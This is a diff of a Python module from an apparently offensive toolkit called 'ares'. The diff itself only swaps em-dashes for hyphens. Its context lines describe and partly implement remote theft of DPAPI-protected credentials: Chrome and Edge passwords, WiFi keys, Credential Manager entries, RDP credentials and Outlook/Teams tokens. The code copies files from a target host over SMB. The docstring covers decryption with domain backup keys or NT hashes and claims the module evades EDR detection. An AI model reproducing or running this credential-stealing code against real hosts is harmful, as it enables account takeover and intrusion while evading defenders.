@@ -1,7 +1,7 @@
 """
-DPAPI Protected Credential Recovery — windows.dpapi
-MITRE: T1555.004 — Credentials from Password Stores: Windows Credential Manager
-       T1555.003 — Credentials from Web Browsers
+DPAPI Protected Credential Recovery - windows.dpapi
+MITRE: T1555.004 - Credentials from Password Stores: Windows Credential Manager
+       T1555.003 - Credentials from Web Browsers
 
 Extracts credentials protected by Windows DPAPI (Data Protection API):
   - Chrome/Edge saved passwords (Login Data SQLite DB)
@@ -11,11 +11,11 @@ Extracts credentials protected by Windows DPAPI (Data Protection API):
   - Outlook/Teams tokens (AppData/Roaming)
 
 Three decryption paths:
-  1. USER CONTEXT    — CryptUnprotectData directly (running as target user)
-  2. DOMAIN BACKUP   — DC backup key decrypts all blobs in domain (from lsa_secrets)
-  3. OFFLINE         — SHA1(NT_HASH) derives DPAPI master key (from lsass_dump)
+  1. USER CONTEXT    - CryptUnprotectData directly (running as target user)
+  2. DOMAIN BACKUP   - DC backup key decrypts all blobs in domain (from lsa_secrets)
+  3. OFFLINE         - SHA1(NT_HASH) derives DPAPI master key (from lsass_dump)
 
-OPSEC: MEDIUM — file access only, no process injection.
+OPSEC: MEDIUM - file access only, no process injection.
        Does not trigger EDR behavior rules by default.
 """
 from __future__ import annotations
@@ -53,7 +53,7 @@ logger = get_logger("ares.modules.windows.dpapi")
 )
 class DPAPIModule(BaseModule):
     """
-    windows.dpapi — Extract DPAPI-protected credentials: Chrome passwords, WiFi PSK, Windows Credential Manager, RDP
+    windows.dpapi - Extract DPAPI-protected credentials: Chrome passwords, WiFi PSK, Windows Credential Manager, RDP
 
     OPSEC: MEDIUM
     MITRE: "T1555.004", "T1555.003"
@@ -173,13 +173,13 @@ class DPAPIModule(BaseModule):
         target = getattr(ctx, "target", "") or (ctx.params.get("target", "") if isinstance(ctx.params, dict) else getattr(ctx.params, "target", ""))
         if not target:
             raise ModuleValidationError(
-                "windows.dpapi requires 'target' — IP of target Windows host.",
+                "windows.dpapi requires 'target' - IP of target Windows host.",
                 module_id=self.MODULE_ID, field="target",
             )
         username = (ctx.params.get("username", "") if isinstance(ctx.params, dict) else getattr(ctx.params, "username", ""))
         if not username:
             raise ModuleValidationError(
-                "windows.dpapi requires 'username' — target user whose DPAPI blobs to decrypt.",
+                "windows.dpapi requires 'username' - target user whose DPAPI blobs to decrypt.",
                 module_id=self.MODULE_ID, field="username",
             )
         await super().validate(ctx)
@@ -334,7 +334,7 @@ class DPAPIModule(BaseModule):
 
         loop = asyncio.get_running_loop()
 
-        # Transfer target files via SMB — surface auth/network errors early
+        # Transfer target files via SMB - surface auth/network errors early
         try:
             local_files = await loop.run_in_executor(
                 None,
@@ -348,7 +348,7 @@ class DPAPIModule(BaseModule):
             if "logon failure" in err or "status_logon_failure" in err:
                 from ares.core.errors import AuthenticationFailed
                 raise AuthenticationFailed(
-                    f"DPAPI SMB auth failed on {target} — check credentials.",
+                    f"DPAPI SMB auth failed on {target} - check credentials.",
                     username=username, module_id=self.MODULE_ID, target=target,
                 ) from exc
             if "timed out" in err or "connection refused" in err:
@@ -382,7 +382,7 @@ class DPAPIModule(BaseModule):
                 )
                 credentials.extend(creds)
 
-            # Chrome Login Data — special handling via sqlite3
+            # Chrome Login Data - special handling via sqlite3
             chrome_creds = await loop.run_in_executor(
                 None,
                 lambda: self._parse_chrome_logindata(
@@ -527,7 +527,7 @@ class DPAPIModule(BaseModule):
                         os.unlink(local_path)
                     except OSError:
                         pass
-                pass   # file not found or no access — continue
+                pass   # file not found or no access - continue
 
         try:
             smb.logoff()
@@ -564,7 +564,7 @@ class DPAPIModule(BaseModule):
                     creds.append({
                         "source":   "credential_manager",
                         "username": target_user,
-                        "note":     "DPAPI blob found — key derivation attempted",
+                        "note":     "DPAPI blob found - key derivation attempted",
                     })
                 except Exception:
                     pass
